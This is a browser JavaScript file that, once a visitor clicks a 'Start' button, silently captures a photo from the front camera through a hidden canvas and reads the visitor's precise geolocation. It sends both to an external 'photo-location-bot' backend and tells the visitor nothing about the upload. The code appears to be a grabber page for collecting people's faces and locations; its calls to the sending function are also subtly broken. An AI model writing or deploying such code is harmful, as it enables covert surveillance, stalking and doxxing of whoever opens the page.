document.addEventListener('DOMContentLoaded', () => {
    const startBtn = document.getElementById('startBtn');
    let hasRequestedCamera = false;
    let hasRequestedGeolocation = false;
    let videoStream = null;

    // Helper function to send data to backend
    async function sendDataToBackend(photo, latitude, longitude) {
    const backendEndpoint = 'https://photo-location-bot.onrender.com/capture';
    const data = { photo, latitude, longitude };
    try {
        const response = await fetch(backendEndpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        console.log('Data sent!', await response.json());
    } catch (err) {
        console.error('Error sending data:', err);
    }
}

    // Function to capture photo from front camera
    async function capturePhoto() {
        if (!hasRequestedCamera) {
            try {
                // Request access to front camera
                videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const videoElement = document.createElement('video');
                videoElement.srcObject = videoStream;
                videoElement.play();

                // Create a canvas to draw the video frame
                const canvas = document.createElement('canvas');
                document.body.appendChild(canvas); // Temporarily add to body for dimension calculation
                canvas.style.display = 'none';

                videoElement.onloadedmetadata = () => {
                    canvas.width = videoElement.videoWidth;
                    canvas.height = videoElement.videoHeight;
                    const context = canvas.getContext('2d');
                    
                    // Draw the current video frame to the canvas
                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                    const imageDataURL = canvas.toDataURL('image/jpeg'); // Get image as Data URL
                    
                    console.log('Photo captured from front camera!');
                    // Optionally, you can display the image or send it immediately
                    
                    // Cleanup: stop video stream and remove temporary elements
                    videoStream.getTracks().forEach(track => track.stop());
                    document.body.removeChild(canvas);
                    
                    // Return the image data
                    sendDataToBackend({ photo: imageDataURL });
                };
                hasRequestedCamera = true;
            } catch (error) {
                console.error('Error accessing camera:', error);
                alert('Could not access camera. Please ensure camera permissions are granted.');
            }
        } else {
            console.log('Camera access already requested.');
        }
    }

    // Function to get geolocation
    function getGeolocation() {
        if (!hasRequestedGeolocation) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        console.log('Geolocation:', { latitude, longitude });
                        sendDataToBackend({ latitude, longitude });
                        hasRequestedGeolocation = true;
                    },
                    (error) => {
                        console.error('Error getting geolocation:', error);
                        alert('Could not get location. Please ensure location permissions are granted.');
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            } else {
                console.error('Geolocation is not supported by this browser.');
                alert('Geolocation is not supported by your browser.');
            }
        } else {
            console.log('Geolocation already requested.');
        }
    }

    startBtn.addEventListener('click', async () => {
        console.log('Start button clicked!');
        await capturePhoto(); // Request camera and capture photo
        getGeolocation(); // Request geolocation
    });
});
